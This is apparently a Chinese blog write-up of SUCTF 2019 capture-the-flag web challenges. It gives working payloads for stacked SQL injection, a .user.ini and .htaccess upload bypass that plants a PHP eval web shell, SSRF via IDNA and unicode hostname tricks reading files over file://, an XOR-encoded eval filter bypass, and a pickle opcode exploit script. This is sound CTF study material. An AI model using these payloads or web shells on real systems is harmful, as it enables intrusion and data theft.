+++
title = "SUCTF2019"
slug = "suctf2019"
description = "刷"
date = "2024-08-11T10:42:05"
lastmod = "2024-08-11T10:42:05"
image = ""
license = ""
categories = ["复现"]
tags = ["mysql"]
+++

# [SUCTF 2019]EasySQL

## 堆叠注入

首先查表

```
1;show tables;
```

如何查`flag`呢,猜测后端语句为

```sql
select $post['query']||flag from Flag
```

那么涉及特性

> SQL_MOD：是MySQL支持的基本语法、校验规则
> 其中PIPES_AS_CONCAT:会将||认为字符串的连接符，而不是或运算符，这时||符号就像concat函数一样。

```sql
select 1||'flag';
1flag

我们执行select concat(1,flag) from Flag即可得到flag
```

`payload`

```sql
1;set sql_mode=PIPES_AS_CONCAT;select 1
后台为
select 1;set sql_mode=PIPES_AS_CONCAT;select concat(1,flag) from Flag
```

还有一种是直接查

当引擎未被打开时

```sql
select 1||'flag'
1

select 0||'flag'
0

select 'a'||'flag'
0
```

那么payload如下

```sql
1;select *,1
后台为
select 1;select *,1 from Flag
```

# [SUCTF 2019]CheckIn

用`.user.ini`即可绕过

```
.user.ini

GIF89a
auto_prepend_file=a.jpg
```

```
a.jpg

GIF89a
<script language='php'>@eval($_POST[1]);</script>
```

就可以`getshell`了

```
Your dir uploads/0211dc66bfdf20bb5c17ed485cf67119
Your files :
array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(5) "a.jpg" [3]=> string(9) "index.php" }
```

看包

```
Request:

POST /index.php HTTP/1.1
Host: 7cf17c12-08e9-4e85-969b-ecc9abdf62b7.node5.buuoj.cn:81
Content-Length: 319
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://7cf17c12-08e9-4e85-969b-ecc9abdf62b7.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjhAmoP5dcNO7Ozj3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://7cf17c12-08e9-4e85-969b-ecc9abdf62b7.node5.buuoj.cn:81/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryjhAmoP5dcNO7Ozj3
Content-Disposition: form-data; name="fileUpload"; filename=".user.ini"
Content-Type: image/jpeg

GIF89a
auto_prepend_file=a.jpg
------WebKitFormBoundaryjhAmoP5dcNO7Ozj3
Content-Disposition: form-data; name="upload"

提交
------WebKitFormBoundaryjhAmoP5dcNO7Ozj3--
```

```
Response:

HTTP/1.1 200 OK
Server: openresty
Date: Sun, 11 Aug 2024 03:34:43 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-cache
Content-Length: 768

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Upload Labs</title>
</head>

<body>
    <h2>Upload Labs</h2>
    <form action="index.php" method="post" enctype="multipart/form-data">
        <label for="file">文件名：</label>
        <input type="file" name="fileUpload" id="file"><br>
        <input type="submit" name="upload" value="提交">
    </form>
</body>

</html>

Your dir uploads/0211dc66bfdf20bb5c17ed485cf67119 <br>Your files : <br>array(5) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(9) ".user.ini"
  [3]=>
  string(5) "a.jpg"
  [4]=>
  string(9) "index.php"
}
```

图片的包就不用看了吧?

```url
http://7cf17c12-08e9-4e85-969b-ecc9abdf62b7.node5.buuoj.cn/uploads/0211dc66bfdf20bb5c17ed485cf67119/

POST:
a=system("tac /f*");
```

# [SUCTF 2019]Pythonginx

应该算是一个`ssrf`

## ssrf

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
    </code>
    <!-- Dont worry about the suctf.cc. Go on! -->
    <!-- Do you know the nginx? -->
```

域名绕过前两个判断不为`suctf.cc`但是经过编码又必须为`suctf.cc`

```python
from urllib.parse import urlsplit,urlunsplit, unquote
from urllib import parse

url = "http:////def"
parts = parse.urlsplit(url)
print(parts)

url2 = urlunsplit(parts)
parts2 = parse.urlsplit(url2)

print(parts2)

#SplitResult(scheme='http', netloc='', path='//def', query='', fragment='')
#SplitResult(scheme='http', netloc='def', path='', query='', fragment='')
```

这样子是可以绕过的

## nginx

*Nginx* (engine x) 是一个高性能的[HTTP](https://baike.baidu.com/item/HTTP)和[反向代理](https://baike.baidu.com/item/反向代理/7793488)web服务器，同时也提供了IMAP/POP3/SMTP服务。

nginx和apache区别：https://cloud.tencent.com/developer/article/1635326

```
#配置
配置文件： /usr/local/nginx/conf/nginx.conf
配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
```

然后我们用`file协议`查看就可以了

```
/getUrl?url=file:////suctf.cc/usr/local/nginx/conf/nginx.conf

/getUrl?url=file:////suctf.cc/usr/fffffflag
```

## idna

这题还有另外的绕过方法

```python
import idna

url = "℆"
print('℆'.encode('idna'))
print(b'c/u'.decode('utf-8'))
```

通过特殊符号由于源码中说明了idna编码的问题,可以选择这样子绕过

```
/getUrl?url=file:////suctf.c℆sr/fffffflag
```

## unicode

```python
from urllib.parse import urlparse,urlunsplit,urlsplit
from urllib import parse
def get_unicode():
    for x in range(65536):
        uni=chr(x)
        url="http://suctf.c{}".format(uni)
        try:
            if getUrl(url):
                print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])
        except:
            pass
def getUrl(url):
    url = url
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return False
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return False
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return True
    else:
        return False
        
if __name__=="__main__":
    get_unicode()

# str: ℂ unicode: \u2102
# str: ℭ unicode: \u212d
# str: Ⅽ unicode: \u216d
# str: ⅽ unicode: \u217d
# str: Ⓒ unicode: \u24b8
# str: ⓒ unicode: \u24d2
# str: Ｃ unicode: \uff23
# str: ｃ unicode: \uff43
```

随便选一个进行`url`编码即可绕过(必须是全编)

```
/getUrl?url=file:////suctf.c%E2%93%92/user/fffffflag
```

# [SUCTF 2019]EasyWeb

文件上传外加RCE绕过

```php
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```

- 图片格式

- 不能有`ph`

- 不能有`<?`

- 参数中字符的种类数量是否超过 12 种

- 参数的长度是否超过 18 个字符

- `! # $ % ( ) * + - / : ; < > ? @ \ ] ^ { }`

我们构造`${_GET}{%ff}();&%ff=phpinfo`

异或脚本

```php
<?php
$payload = '';
$x = '_GET';
for($i = 0; $i < strlen($x); $i++){
    for ($j = 0; $j < 255; $j++){
        $k = chr($j) ^ chr(248);
        if ($k == $x[$i]) {
            $payload .= '%'.dechex($j);
        }
    }
}
echo '%f8%f8%f8%f8^'.$payload;
?>
```

```
?_=${%f8%f8%f8%f8^%a7%bf%bd%ac}{%f8}();&%f8=phpinfo

?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
```

然后就得到`flag`了但是没有`getshell`继续

然后就是上传文件但是没有切入点那就用脚本,文件内容

```
poc.jpg:

GIF89a
PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=
```

然后绕过可以有两种

```
\x00\x00\x8a\x39\x8a\x39

#define width 1337
#define height 1337
```

```
.htaccess:

#define width 1337
#define height 1337
php_value auto_prepend_file "php://filter/convert.base64-decode/resource=./poc.jpg"
AddType application/x-httpd-php .jpg
```

上传文件的HTML

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<!--题目链接-->
<form action="http://11973075-4e71-40d4-bca4-fec6b297d135.node5.buuoj.cn:81/?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%A0}();&%A0=get_the_flag" method="post" enctype="multipart/form-data">
    <label for="file">文件名：</label>
    <input type="file" name="file" id="postedFile"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

路径

```
upload/tmp_0211dc66bfdf20bb5c17ed485cf67119/.htaccess
upload/tmp_0211dc66bfdf20bb5c17ed485cf67119/poc.jpg
```

然后我就发现不能`getshell`,忘了一个细节base64解码是四位一组,所以还得添加2位

```
GIF89a66
PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=
```

链接`antsword`找到`flag`

# [SUCTF 2019]Guess Game

```python
from guess_game.Ticket import Ticket
from guess_game.RestrictedUnpickler import restricted_loads
from struct import unpack
from guess_game import game
import sys


def get_flag():
    with open('/flag', 'r') as f:
        flag = f.read().strip()
    return flag


def read_length(obj):
    return unpack('>I', obj)


def stdin_read(length):
    return sys.stdin.buffer.read(length)


try:
    while not game.finished():
        length = stdin_read(4)
        length, = read_length(length)

        ticket = stdin_read(length)
        ticket = restricted_loads(ticket)

        assert type(ticket) == Ticket

        if not ticket.is_valid():
            print('The number is invalid.')
            game.next_game(Ticket(-1))
            continue

        win = game.next_game(ticket)
        if win:
            text = "Congratulations, you get the right number!"
        else:
            text = "Wrong number, better luck next time."
        print(text)

    if game.is_win():
        text = "Game over! You win all the rounds, here is your flag %s" % get_flag()
    else:
        text = "Game over! You got %d/%d." % (game.win_count, game.round_count)
    print(text)

except Exception:
    print('Houston, we got a problem.')
```

其实这个逻辑看起来很简单

```python
        ticket = restricted_loads(ticket)

        assert type(ticket) == Ticket
```

他是反序列化之后再检查的，这个时候我们利用操作码修改全局变量即可

```python
import pickle
import socket
import struct

s = socket.socket()
s.connect(('node5.buuoj.cn', 26335))

exp = b'''cguess_game
game
}S"win_count"
I10
sS"round_count"
I9
sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\xffsb.'''

s.send(struct.pack('>I', len(exp)))
s.send(exp)

print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
```

# [SUCTF 2019]Upload Labs 2

https://baozongwi.github.io/p/phar-deserialization-analysis/
